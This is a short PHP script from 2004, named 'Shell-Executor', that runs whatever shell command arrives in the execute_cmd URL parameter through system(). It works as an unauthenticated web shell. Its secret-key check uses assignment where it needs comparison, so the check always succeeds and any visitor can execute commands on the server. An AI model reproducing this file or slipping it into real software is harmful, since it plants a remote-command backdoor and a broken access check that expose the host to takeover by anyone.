<?php

/***************************************
** Title........: Shell-Executor    executes commands, but has different extension (phpx) for use with cgi
** Filename.....: shell_exec.phpx
** Author.......: Edgar Bueltemeyer
** Version......: 0.1
** Notes........:
** Last changed.: 02/Nov/2004
** Last change..:
***************************************/

if($_GET[key]='SK_EXC%$asxd'){
$execute_cmd=urldecode($_GET[execute_cmd]);
//include('./skutil.inc.php');
system($execute_cmd,$retval);
//exec($execute_cmd,$retval);

if($retval<>0) {
   echo "WRAPPER:".$retval." -> EXECUTE FAILED";
}else{
   echo "WRAPPER:".$retval." -> EXECUTE OK";
}

}
?>